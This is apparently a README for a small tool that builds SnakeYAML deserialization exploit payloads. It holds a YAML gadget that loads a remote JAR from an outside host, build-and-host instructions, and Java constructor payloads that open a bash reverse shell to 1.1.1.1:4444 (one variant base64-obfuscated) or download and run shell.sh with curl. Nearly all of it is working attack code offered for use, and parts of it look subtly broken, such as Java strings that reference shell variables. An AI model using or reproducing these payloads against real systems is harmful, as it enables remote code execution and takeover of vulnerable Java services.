A tiny project for generating payloads for the SnakeYAML deserialization gadget (taken from https://github.com/mbechler/marshalsec):
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]
```
Put the java code you want execute into [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) and compile:
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

Then place the 'yaml-payload.jar' file in to the web server folder (e.g. artsploit.com/yaml-payload.jar)

## Additional Payload Examples

The [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) file includes additional payload examples in the comments. To use them, replace the constructor in the file with one of the examples below and rebuild.

### Example 1: Reverse Shell Payloads
Replace the constructor with:
```java
public AwesomeScriptEngineFactory() {
    String [] cmd={"bash","-c","bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"};
    String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
    try {
        Runtime.getRuntime().exec(cmd);
        Runtime.getRuntime().exec(jex);
        Runtime.getRuntime().exec("echo $jex");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

### Example 2: Download and Execute Payloads
Replace the constructor with this and add the `RunCmd` helper method to the class:
```java
public AwesomeScriptEngineFactory() {
    RunCmd("curl 1.1.1.1/shell.sh -o /tmp/shell.sh");
    RunCmd("bash /tmp/shell.sh");
}

public String RunCmd(String Cmd) {
    try {
        Runtime.getRuntime().exec(Cmd);
    } catch (IOException e) {
        e.printStackTrace();
    }
    return null;
}
```

After modifying the source file, rebuild the JAR:
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```
